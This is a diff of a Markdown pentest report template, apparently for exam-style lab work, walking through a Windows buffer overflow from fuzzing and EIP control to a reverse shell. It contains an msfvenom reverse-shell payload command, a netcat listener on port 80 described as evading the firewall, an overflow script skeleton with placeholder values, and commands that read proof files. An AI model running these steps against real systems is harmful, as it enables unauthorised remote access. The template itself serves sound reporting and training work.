@@ -20,9 +20,13 @@ Server IP Address | Ports Open | Service | Application
 
 The command detected by manually probing the service is "SOMETHING".  Fuzzing the service crashes when sending between LOW and HIGH bytes but this is a possible range as the crash may have occurred earlier.
 
+---
+
 ```Bash
 # Output from fuzzing script
 ```
+
+---
 
 Identification of a buffer overflow by causing a crash is one thing but In order to progress the damage from loss of availability to exploitation the exact byte causing the overflow is needed.  To find this value a unique string of characters is sent to the service and the EIP at crash evaluated for the exact for characters.  The EIP contains ADDRESS which occurs at byte **NUMBER**.
 
@@ -32,6 +36,8 @@ To control the EIP line X of the script was modified to have an offset equal to 
 
 > Be sure to escape all byte characters or it will prevent the PDF report from generating with autorpt.
 
+---
+
 ```Python
 18: offset = NUMBER
 19: overflow = "A" * offset
@@ -39,6 +45,9 @@ To control the EIP line X of the script was modified to have an offset equal to 
 ...
 26: buffer = prefix + overflow + retn
 ```
+
+---
+
 Upon the next exploit attempt Immunity shows the intended four "ZZZZ" characters in the EIP validating attacker control.
 
 #### 4. Find Bad Characters
@@ -80,46 +89,82 @@ I ran the mona command to locate an appropriate jump point and selected DLL_NAME
 
 Closing the circle on the proof of concept system involves attaining an internactive shell on the target system.  
 
+---
+
+
 ```Bash
 msfvenom -p windows/shell_reverse_tcp LHOST=KALILINUX LPORT=80 EXITFUNC=thread -b "\\x00..." -f c
 ```
 
+---
+
+
 Setup a netcat listener on TCP port 80 to evade the firewall on the target server.
+
+---
+
 
 ```Bash
 sudo nc -nvlp 80
 ```
 
+---
+
+
 Run the exploit.  An interactive shell to the proof of concept server is established.
 
-```Bash
+---
 
+```Bash
+sh runmescripto.sh
 ```
+
+---
 
 #### 7. Exploit Production Target
 
 With a complete proof of concept buffer overflow leading to interactive shell I repeated the shellcode creation step for the target production server.
 
+---
+
+
 ```Bash
 msfvenom -p windows/shell_reverse_tcp LHOST=KALILINUX LPORT=80 EXITFUNC=thread -b "\\x00..." -f c
 ```
 
+---
+
+
 Setup a netcat listener on TCP port 80 to evade target system firewall.
+
+---
+
 
 ```Bash
 sudo nc -nvlp 80
 ```
 
+---
+
+
 Run the exploit.  An interactive shell to the production server is established.
+
+---
+
 
 ```Bash
 ipconfig
 type "c:\Documents and Settings\Administrator\Desktop\proof.txt"
 ```
 
+---
+
+
 > Delete this note and the OS output not needed for evidence.
 
 **Linux**
+
+---
 
 ```Bash
 cat /root/proof.txt
@@ -130,7 +175,11 @@ find / -type f -name local.txt
 cat local.txt
 ```
 
+---
+
 **Windows**
+
+---
 
 ```Powershell
 type "c:\Documents and Settings\Administrator\Desktop\proof.txt"
@@ -142,19 +191,15 @@ dir /s local.txt
 type local.txt
 ```
 
+---
+
 #### Proof.txt
 
 **Screenshot**
 
 Screenshot must show proof.txt contents with `cat` or `type` command and output from `ipconfig` or `ip`.  Additionally, search the system for local.txt to cover all bases.  
 
-Rewrite all pasted images from this 
-"\![[Pasted image 20210510161424.png]]" to this 
-"\"![Pasted image 20210510161424.png](Pasted image 20210510161424.png)""
-
-PDF generation may not size images correctly and you may need to force the width.
-![sample default resolution](images/placeholder-image-300x225.png)
-![sample 600px wide, full page width](images/placeholder-image-300x225.png){ width="600px" }
+![Alt text](images/placeholder-image-300x225.png "title"){ width=50%}
 
 **Contents**
 
